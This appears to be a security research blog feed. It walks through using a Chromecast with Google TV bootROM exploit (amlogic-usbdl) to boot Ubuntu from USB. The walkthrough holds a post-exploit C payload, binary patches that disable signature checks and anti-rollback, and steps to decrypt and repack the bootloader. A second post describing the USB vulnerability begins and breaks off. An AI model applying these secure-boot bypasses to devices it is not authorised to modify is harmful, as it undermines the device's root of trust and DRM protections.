&lt;p&gt;A &lt;a href="https://github.com/ReFirmLabs/binwalk"&gt;quick analysis&lt;/a&gt; of this &lt;em&gt;bootloader&lt;/em&gt; partition doesn't reveal any standard filesystem, this file format seems proprietary. But since we also &lt;a href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html"&gt;dumped the bootROM&lt;/a&gt;, we can still analyze the code that loads the BL2 image to find its location in the &lt;em&gt;bootloader&lt;/em&gt; partition :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;OFFSET&lt;/th&gt;
&lt;th&gt;SIZE&lt;/th&gt;
&lt;th&gt;DESCRIPTION&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;0x1000&lt;/td&gt;
&lt;td&gt;BL2 header&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1000&lt;/td&gt;
&lt;td&gt;0xF000&lt;/td&gt;
&lt;td&gt;BL2 code&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x10000&lt;/td&gt;
&lt;td&gt;n&lt;/td&gt;
&lt;td&gt;Encrypted (BL3x)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1&gt;Payload for BL1 exploitation&lt;/h1&gt;
&lt;p&gt;The &lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;exploitation tool amlogic-usbdl&lt;/a&gt; allows us to load BL2 image in SRAM and execute it without signature check.
However, the bootROM exploitation leaves the USB controller in an invalid state, and this will prevent U-Boot from using it.&lt;/p&gt;
&lt;p&gt;So we need a payload that restores the USB controller state before jumping to BL2 image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define _clear_icache() ((void (*)(void))0xffff048c)()&lt;/span&gt;
&lt;span class="cp"&gt;#define _dwc_pcd_irq() ((void (*)(void))0xffff8250)()&lt;/span&gt;
&lt;span class="cp"&gt;#define _jmp_bl2() ((void (*)(void))0xfffa1000)()&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;_start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;_clear_icache&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;//clear instruction cache&lt;/span&gt;
    &lt;span class="n"&gt;_dwc_pcd_irq&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  &lt;span class="c1"&gt;//clear USB state&lt;/span&gt;
    &lt;span class="n"&gt;_dwc_pcd_irq&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  &lt;span class="c1"&gt;//after exploitation&lt;/span&gt;
    &lt;span class="n"&gt;_jmp_bl2&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;      &lt;span class="c1"&gt;//jump to BL2 entrypoint&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Function &lt;code&gt;_dwc_pcd_irq&lt;/code&gt; is the USB interruption handler implemented in the bootROM USB stack. 
When the bootROM vulnerability is exploited, the code flow is diverted from this function, which obviously
prevents USB events to be fully and properly handled. Luckily for us, executing that USB handler a couple of times is enough to restore USB controller state.&lt;/p&gt;
&lt;p&gt;This payload is copied at the beginning of the BL2 image. The data overwritten are headers that aren't used because the exploit jumps directly to this payload, which then jumps to BL2 entrypoint.&lt;/p&gt;
&lt;h1&gt;Hacking BL2 image&lt;/h1&gt;
&lt;p&gt;As previously mentioned, we use the &lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;exploitation tool amlogic-usbdl&lt;/a&gt; to load and run BL2 image. But the original BL2 image implements few features we must first disable to boot properly. This is where it gets dirty. We are free to modify BL2 code because it's signature won't be checked.&lt;/p&gt;
&lt;h2&gt;Disabling BL33 Authentication&lt;/h2&gt;
&lt;p&gt;Once loaded via USB and run, the BL2 code expects to receive the rest of the boot chain. If Secure Boot is enabled, BL2 checks the signature of all images including BL33 (U-Boot). We don't have the right key to sign our custom BL33 image, therefore we need to disable the BL33 signature check. We modify BL2 code to ignore the result of the signature check on BL33 image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- &amp;lt;sabrina.bl2.factory.2020-07-13.img&amp;gt;&lt;/span&gt;
&lt;span class="gi"&gt;+++ &amp;lt;sabrina.bl2.noSB.img&amp;gt;&lt;/span&gt;
&lt;span class="gu"&gt;@@ -3,5 +3,5 @@&lt;/span&gt;
 fffabd70 81 c2 00 91     add        x1,x20,#0x30
 fffabd74 02 04 80 d2     mov        x2,#0x20
 fffabd78 8a 02 00 94     bl         secure_memcmp
&lt;span class="gd"&gt;-fffabd7c 60 03 00 35     cbnz       w0,auth_fail&lt;/span&gt;
&lt;span class="gi"&gt;+fffabd7c 00 00 80 52     mov        w0,#0x0&lt;/span&gt;
 fffabd80 80 72 40 39     ldrb       w0,[x20, #0x1c]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Disabling Anti-RollBack&lt;/h2&gt;
&lt;p&gt;Anti-rollback (ARB) feature prevents execution of firmware images older than a specific version, which is stored in One Time Programmable (OTP a.k.a. efuses) memory. When firmware images are updated to a higher ARB version number, the OTP version is bumped-up by burning additional efuses.&lt;/p&gt;
&lt;p&gt;So two kind of issues could arise depending on the bootloader version we run :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if older than the version in OTP: ARB check will fail and it just won't boot.&lt;/li&gt;
&lt;li&gt;if more recent than version in OTP : OTP version will be increased, and the ARB protection will block the original firmware (older version) from booting.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In order to prevent such issues, we picked the oldest &lt;em&gt;bootloader&lt;/em&gt; partition available (factory firmware), and we disable ARB feature in BL2 code :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- &amp;lt;sabrina.bl2.noSB.img&amp;gt;&lt;/span&gt;
&lt;span class="gi"&gt;+++ &amp;lt;sabrina.bl2.noSB.noARB.img&amp;gt;&lt;/span&gt;
&lt;span class="gu"&gt;@@ -1,8 +1,8 @@&lt;/span&gt;
                      uint __cdecl IS_FEAT_ANTIROLLBACK_ENABLE(void)
      uint              w0:4           &amp;lt;RETURN&amp;gt;
                      IS_FEAT_ANTIROLLBACK_ENABLE
 fffa1744 00 06 80 d2     mov        x0,#0x30
 fffa1748 60 ec bf f2     movk       x0,#0xff63, LSL #16
 fffa174c 00 00 40 b9     ldr        w0,[x0]=&amp;gt;SEC_EFUSE_LIC0
&lt;span class="gd"&gt;-fffa1750 00 18 46 d3     ubfx       x0,x0,#0x6,#0x1&lt;/span&gt;
&lt;span class="gi"&gt;+fffa1750 00 00 80 d2     mov        x0,#0x0&lt;/span&gt;
 fffa1754 c0 03 5f d6     ret
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Size reduction&lt;/h2&gt;
&lt;p&gt;We remove 0x100 bytes of padding at the end of the BL2 image (original size is 0x10000 bytes) to comply with the 0xFF00 bytes payload size limit imposed by the exploitation tool.&lt;/p&gt;
&lt;h1&gt;Building &amp;amp; customizing BL33&lt;/h1&gt;
&lt;p&gt;Unlike BL2, BL33 is based on &lt;a href="https://support.google.com/chromecastbuiltin/answer/6121012"&gt;Open Source software U-Boot&lt;/a&gt;, so building &amp;amp; customizing it is pretty straightforward.&lt;/p&gt;
&lt;p&gt;U-Boot boot sequence is defined with a scripting language that supports variables (global, local), control structures (if, while, etc...), and commands. We &lt;a href="https://github.com/frederic/sabrina-uboot/commit/048ce71f67ac2622dc973f86a944679fbc026374"&gt;modify&lt;/a&gt; the original script that boots from internal eMMC to instead load and run another script named &lt;code&gt;s905_autoscript&lt;/code&gt; from an USB drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- sabrina-uboot/board/amlogic/configs/sm1_sabrina_v1.h&lt;/span&gt;
&lt;span class="gi"&gt;+++ sabrina-uboot/board/amlogic/configs/sm1_sabrina_v1.h&lt;/span&gt;
&lt;span class="gu"&gt;@@ -297,17 +299,14 @@&lt;/span&gt;
             &amp;quot;if test ${active_slot} != normal; then &amp;quot;\
                 &amp;quot;setenv bootargs ${bootargs} androidboot.slot_suffix=${active_slot};&amp;quot;\
             &amp;quot;fi;&amp;quot;\
&lt;span class="gd"&gt;-            &amp;quot;if test ${avb2} = 0; then &amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                &amp;quot;if test ${active_slot} = _a; then &amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                    &amp;quot;setenv bootargs ${bootargs} root=/dev/mmcblk0p23;&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                &amp;quot;else if test ${active_slot} = _b; then &amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                    &amp;quot;setenv bootargs ${bootargs} root=/dev/mmcblk0p24;&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                &amp;quot;fi;fi;&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-            &amp;quot;fi;&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-            &amp;quot;if imgread kernel ${boot_part} ${loadaddr}; then &amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-                &amp;quot;bootm ${loadaddr};&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-            &amp;quot;fi;&amp;quot;\&lt;/span&gt;
&lt;span class="gd"&gt;-            &amp;quot;run fallback;&amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;echo Sleep 10 secs before USB DRIVE boot from ${loadaddr} ...; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;sleep 10; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;usb start 0; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;usb tree; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;usb info; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;fatload usb 0 ${loadaddr} s905_autoscript;&amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;setenv autoscript_source usb; &amp;quot;\&lt;/span&gt;
&lt;span class="gi"&gt;+            &amp;quot;autoscr ${loadaddr};&amp;quot;\&lt;/span&gt;
             &amp;quot;\0&amp;quot;\
         &amp;quot;upgrade_check=&amp;quot; \
             &amp;quot;echo upgrade_step=${upgrade_step}; &amp;quot;\
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By loading and running a script from an external media, we have the possibility to change the boot script without recompiling U-Boot or repacking the &lt;em&gt;bootloader&lt;/em&gt; image.&lt;/p&gt;
&lt;p&gt;Just like other bootloaders in the chain, U-Boot detects if it's been loaded from USB. In such case, U-Boot skips the normal boot sequence and starts an USB recovery interface (a.k.a. USB burning mode) instead. We have to disable that behavior to ensure the boot sequence we just modified is run :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- sabrina-uboot/board/amlogic/sm1_sabrina_v1/sm1_sabrina_v1.c&lt;/span&gt;
&lt;span class="gi"&gt;+++ sabrina-uboot/board/amlogic/sm1_sabrina_v1/sm1_sabrina_v1.c&lt;/span&gt;
&lt;span class="gu"&gt;@@ -583,13 +583,6 @@ void set_i2c_ao_pinmux(void)&lt;/span&gt;
 int board_init(void)
 {
        sys_led_init();
&lt;span class="gd"&gt;-    //Please keep CONFIG_AML_V2_FACTORY_BURN at first place of board_init&lt;/span&gt;
&lt;span class="gd"&gt;-    //As NOT NEED other board init If USB BOOT MODE&lt;/span&gt;
&lt;span class="gd"&gt;-#ifdef CONFIG_AML_V2_FACTORY_BURN&lt;/span&gt;
&lt;span class="gd"&gt;-       if ((0x1b8ec003 != readl(P_PREG_STICKY_REG2)) &amp;amp;&amp;amp; (0x1b8ec004 != readl(P_PREG_STICKY_REG2))) {&lt;/span&gt;
&lt;span class="gd"&gt;-                               aml_try_factory_usb_burning(0, gd-&amp;gt;bd);&lt;/span&gt;
&lt;span class="gd"&gt;-       }&lt;/span&gt;
&lt;span class="gd"&gt;-#endif// #ifdef CONFIG_AML_V2_FACTORY_BURN&lt;/span&gt;
 #ifdef CONFIG_USB_XHCI_AMLOGIC_V2
        board_usb_pll_disable(&amp;amp;g_usb_config_GXL_skt);
        board_usb_init(&amp;amp;g_usb_config_GXL_skt,BOARD_USB_MODE_HOST);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nevertheless, this recovery interface can still be useful in some cases, so we repurpose the physical button &lt;em&gt;GPIOAO_10&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gd"&gt;--- sabrina-uboot/board/amlogic/configs/sm1_sabrina_v1.h&lt;/span&gt;
&lt;span class="gi"&gt;+++ sabrina-uboot/board/amlogic/configs/sm1_sabrina_v1.h&lt;/span&gt;
&lt;span class="gu"&gt;@@ -397,9 +396,7 @@&lt;/span&gt;
         &amp;quot;upgrade_key=&amp;quot; \
             &amp;quot;if gpio input GPIOAO_10; then &amp;quot; \
                 &amp;quot;echo GPIOAO_10 pressed;&amp;quot; \
&lt;span class="gd"&gt;-                &amp;quot;if usb start 0; then &amp;quot; \&lt;/span&gt;
&lt;span class="gd"&gt;-                    &amp;quot;run recovery_from_udisk;&amp;quot; \&lt;/span&gt;
&lt;span class="gd"&gt;-                &amp;quot;fi;&amp;quot; \&lt;/span&gt;
&lt;span class="gi"&gt;+                &amp;quot;update 0;&amp;quot; \&lt;/span&gt;
             &amp;quot;fi;&amp;quot; \
             &amp;quot;\0&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When the physical button is hold while U-Boot starts, the USB recovery interface is started by executing &lt;a href="https://github.com/frederic/sabrina-uboot/blob/048ce71f67ac2622dc973f86a944679fbc026374/drivers/usb/gadget/v2_burning/v2_usb_tool/optimus_core.c#L77"&gt;U-Boot command "update"&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/sabrina-uboot"&gt;U-Boot source tree with these modifications&lt;/a&gt; is available on GitHub, as well as building instructions in the &lt;a href="https://github.com/frederic/sabrina-uboot/blob/QTS2.200918.025-USBboot/README.md"&gt;README file&lt;/a&gt;. A &lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/bootloader/u-boot.bin"&gt;prebuilt image&lt;/a&gt; is also available.&lt;/p&gt;
&lt;h1&gt;Repacking bootloader with custom BL33&lt;/h1&gt;
&lt;p&gt;Essentially, we just need to replace the original BL33 image with the custom one in the &lt;em&gt;bootloader&lt;/em&gt; partition. However in practice, it's a trickier task than it appears.
First, the &lt;em&gt;bootloader&lt;/em&gt; partition is encrypted (except BL2). Then, its format is proprietary. Last, BL33 image is compressed using LZ4 algorithm.&lt;/p&gt;
&lt;p&gt;Ideally, we would write a complete (un)packing tool with encryption/compression support for the &lt;em&gt;bootloader&lt;/em&gt; partition.
It didn't happen. Instead, we'll hack it quick 'n dirty. The following steps are implemented in script &lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/scripts/repack_bootloader.sh"&gt;repack_bootloader.sh&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;AES decryption&lt;/h2&gt;
&lt;p&gt;By analyzing the bootROM, we learn that the &lt;em&gt;bootloader&lt;/em&gt; partition is encrypted with AES-256-CBC and the key is stored at address 0xFFFE0020. This key can be dumped using the exploitation tool &lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;amlogic-usbdl&lt;/a&gt; with the &lt;a href="https://github.com/frederic/amlogic-usbdl/blob/main/payloads/memdump_over_usb.c"&gt;memdump_over_usb&lt;/a&gt; payload. We can then use &lt;a href="https://wiki.openssl.org/index.php/Enc"&gt;OpenSSL&lt;/a&gt; to decrypt the &lt;em&gt;bootloader&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ openssl enc -aes-256-cbc -nopad -d -K &lt;span class="m"&gt;0000000000000000000000000000000000000000000000000000000000000000&lt;/span&gt; -iv &lt;span class="m"&gt;00000000000000000000000000000000&lt;/span&gt; -in bootloader.enc -out bootloader.img
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;LZ4 compression&lt;/h2&gt;
&lt;p&gt;We compress our custom BL33 image using the official tool &lt;a href="https://github.com/khadas/u-boot/blob/khadas-vims-pie/fip/g12a/aml_encrypt_g12a"&gt;aml_encrypt_g12a&lt;/a&gt; provided by Khadas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ aml_encrypt_g12a --bl3sig --input u-boot.bin --compress lz4 --output u-boot.enc --level v3 --type bl33
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;dd editing&lt;/h2&gt;
&lt;p&gt;Compressed BL33 image starts with a magic value &lt;strong&gt;LZ4C&lt;/strong&gt;. Thanks to this marker, we can identify the BL33 image offset in the &lt;em&gt;bootloader&lt;/em&gt; partition, and simply overwrite it with our custom, compressed BL33 &lt;em&gt;u-boot.enc&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;IN_OFFSET&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;grep --byte-offset --only-matching --text LZ4C u-boot.enc &lt;span class="p"&gt;|&lt;/span&gt; head -1 &lt;span class="p"&gt;|&lt;/span&gt; cut -d: -f1&lt;span class="sb"&gt;`&lt;/span&gt;
$ &lt;span class="nv"&gt;OUT_OFFSET&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;grep --byte-offset --only-matching --text LZ4C bootloader.img &lt;span class="p"&gt;|&lt;/span&gt; head -1 &lt;span class="p"&gt;|&lt;/span&gt; cut -d: -f1&lt;span class="sb"&gt;`&lt;/span&gt;
$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;u-boot.enc &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;bootloader.img &lt;span class="nv"&gt;skip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$IN_OFFSET&lt;/span&gt; &lt;span class="nv"&gt;seek&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$OUT_OFFSET&lt;/span&gt; &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;conv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;notrunc
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;AES encryption&lt;/h2&gt;
&lt;p&gt;Finally, the modified &lt;em&gt;bootloader&lt;/em&gt; image is encrypted back using OpenSSL again.&lt;/p&gt;
&lt;h1&gt;Preparing bootable USB flash drive&lt;/h1&gt;
&lt;p&gt;With our customized bootchain ready to boot from USB, it's time to prepare the OS on an USB flash drive.&lt;/p&gt;
&lt;p&gt;First, we write a &lt;a href="https://drive.google.com/file/d/1Xw8iReDfNtXyDvh0qtqMKMYjw7HsCpeI/view?usp=sharing"&gt;preinstalled image of Ubuntu for ARM64&lt;/a&gt; on the USB flash drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ubuntu-20.10-preinstalled-desktop-arm64+raspi.img &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/&amp;lt;device&amp;gt; &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, we add few files in &lt;em&gt;boot&lt;/em&gt; partition :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/s905_autoscript"&gt;s905_autoscript&lt;/a&gt; : compiled boot script (&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/s905_autoscript.cmd"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/env.txt"&gt;env.txt&lt;/a&gt; : additional U-Boot environment variables&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/dtb.img"&gt;dtb.img&lt;/a&gt; : Device Tree Blob for CCwGTV (&lt;a href="https://github.com/frederic/sabrina-linux"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/uInitrd"&gt;uInitrd&lt;/a&gt; : original ramdisk from Ubuntu (&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/scripts/repack_initrd.sh"&gt;repacked for U-Boot&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/frederic/sabrina-custom-os/blob/main/rootfs/zImage"&gt;zImage&lt;/a&gt; : Linux kernel image for CCwGTV (&lt;a href="https://github.com/frederic/sabrina-linux"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Precompiled files and detailed instructions are &lt;a href="https://github.com/frederic/sabrina-custom-os#readme"&gt;available on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Booting Ubuntu from USB&lt;/h1&gt;
&lt;p&gt;We can finally boot Ubuntu from the USB flash drive by following these steps :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Connect target to host via USB to exploit bootROM and run modified BL2&lt;/li&gt;
&lt;li&gt;Send over USB the custom &lt;em&gt;bootloader&lt;/em&gt; image (which includes the custom U-Boot image)&lt;/li&gt;
&lt;li&gt;Connect USB flash drive that contains boot script, kernel image and the rest of the OS.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since CCwGTV only offers a single USB-C port, we also need an &lt;a href="https://intpw.com/collections/hub/products/intpw-usb-c-to-hdmi-adapter-for-nintendo-switch"&gt;USB-C adapter&lt;/a&gt; that splits power and data, so we can connect simultaneously a power source and an USB device.&lt;/p&gt;
&lt;p&gt;Detailed instructions are available in the &lt;a href="https://github.com/frederic/sabrina-custom-os/"&gt;README file on GitHub, along with all the resources (bootloaders/tools/scripts)&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Due to a bootROM vulnerability, the entire software stack of CCwGTV can be replaced. This means booting an alternative OS like Ubuntu is theoretically possible. But in practice, replacing proprietary software components (like bootloaders or TEE) requires significant engineering efforts, especially without debugging capabilities.&lt;/p&gt;
&lt;p&gt;Instead, we preferred to reuse as many original software components as possible, which we minimally modified to boot a custom OS.&lt;/p&gt;
&lt;p&gt;As explained in the previous blog post, the &lt;a href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html"&gt;vulnerability has since been mitigated&lt;/a&gt; with a software update. It doesn't fix the bug, as bootROM is read-only. But, luckily, the SoC allows OEMs to restrict access to the USB download mode by burning &lt;a href="https://en.wikipedia.org/wiki/Efuse"&gt;eFuses&lt;/a&gt;. This software update burns eFuses to make the vulnerable code inaccessible to attackers.&lt;/p&gt;
&lt;p&gt;However, once in possession of a vulnerable device (unpatched eFuses), attackers can modify software updates before applying them to neutralize the eFuse patch.
Therefore, they can run an official up-to-date OS while keeping the vulnerable USB download mode accessible for exploitation.&lt;/p&gt;
&lt;p&gt;This issue is serious for devices like CCwGTV that are supposed to guarantee a Trusted Execution Environment for DRM. Once root-of-trust has been compromised, restoring it is a difficult challenge for OEMs.&lt;/p&gt;</content><category term="arm"></category><category term="amlogic"></category><category term="bootloader"></category><category term="bootrom"></category><category term="chromecast"></category><category term="uboot"></category><category term="ubuntu"></category><category term="usb"></category></entry><entry><title>amlogic-usbdl : unsigned code loader for Amlogic BootROM</title><link href="https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html" rel="alternate"></link><published>2021-02-10T00:00:00-08:00</published><updated>2021-02-10T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2021-02-10:/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html</id><summary type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse the USB stack in the Exynos bootROM&lt;/a&gt;, which led to the &lt;a href="https://fredericb.info/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html"&gt;discovery of a critical bug&lt;/a&gt;.
After reproducing this methodology on &lt;a href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html"&gt;Amlogic bootROM recently dumped&lt;/a&gt;, a similar vulnerability has been discovered in the USB stack that can be exploited to run arbitrary …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In previous posts, we explained how to &lt;a href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html"&gt;reverse the USB stack in the Exynos bootROM&lt;/a&gt;, which led to the &lt;a href="https://fredericb.info/2020/06/exynos-usbdl-unsigned-code-loader-for-exynos-bootrom.html"&gt;discovery of a critical bug&lt;/a&gt;.
After reproducing this methodology on &lt;a href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html"&gt;Amlogic bootROM recently dumped&lt;/a&gt;, a similar vulnerability has been discovered in the USB stack that can be exploited to run arbitrary code.&lt;/p&gt;
&lt;p&gt;The following targets are known to be vulnerable :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.khadas.com/vim3l"&gt;Khadas VIM3L&lt;/a&gt; (S905D3) (Secure boot is disabled anyway)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://store.google.com/us/product/chromecast_google_tv"&gt;Chromecast with Google TV&lt;/a&gt; (S905D3G)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The difference between S905D3 &amp;amp; S905D3&lt;strong&gt;G&lt;/strong&gt; is not clear at this moment; it may be related to the &lt;a href="https://www.riscure.com/services/riscure-assurance-for-premium-content-registry/"&gt;gold certification&lt;/a&gt; this component received for &lt;em&gt;Premium Content&lt;/em&gt; processing.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/amlogic-usbdl"&gt;amlogic-usbdl, an open source tool available on Github&lt;/a&gt;, exploits this vulnerability to load and run unsigned code.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cash 4 gold" src="https://fredericb.info/blog/aml-bootrom/c4g.gif" style="display: block;margin-left: auto;margin-right: auto;"&gt;&lt;/p&gt;
&lt;h1&gt;Vulnerability details&lt;/h1&gt;
&lt;h2&gt;USB Download protocol&lt;/h2&gt;
&lt;p&gt;Amlogic BootROM implements a custom USB protocol that allows USB host to execute a &lt;a href="https://github.com/khadas/u-boot/blob/khadas-vims-pie/drivers/usb/gadget/aml_tiny_usbtool/usb_pcd.h"&gt;set of commands&lt;/a&gt; on target device i.e. read/write memory, run code, read/write registers. A common use-case for this protocol is to upload a bootloader and run it.
On Secure Boot-enabled devices like Chromecast, a signature check is performed first before executing any uploaded code.&lt;/p&gt;
&lt;p&gt;Among these commands, USB host can use &lt;a href="https://github.com/khadas/u-boot/blob/0bfb38ab1e9ab34585ded5b8c921fbe12361f5bf/drivers/usb/gadget/aml_tiny_usbtool/usb_pcd.h#L40"&gt;AM_REQ_WR_LARGE_MEM&lt;/a&gt; to upload data into device memory.&lt;/p&gt;
&lt;p&gt;First, USB host sends an USB CONTROL transfer with some infos regarding the payload :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;URB setup
    bmRequestType: 0x40 : Direction: Host-to-device - Type: Vendor (0x2) - Recipient: Device (0x00)
    bRequest: 17 (0x11) : Write memory command AM_REQ_WR_LARGE_MEM
    wValue: 0x1000      : size of each BULK transfer
    wIndex: 16 (0x0010) : count of BULK transfers
    wLength: 16         : size of data in this CONTROL transfer
    Data Fragment: 0000faff000010000000000000000000
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The data fragment follows the following structure :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dldata_s&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
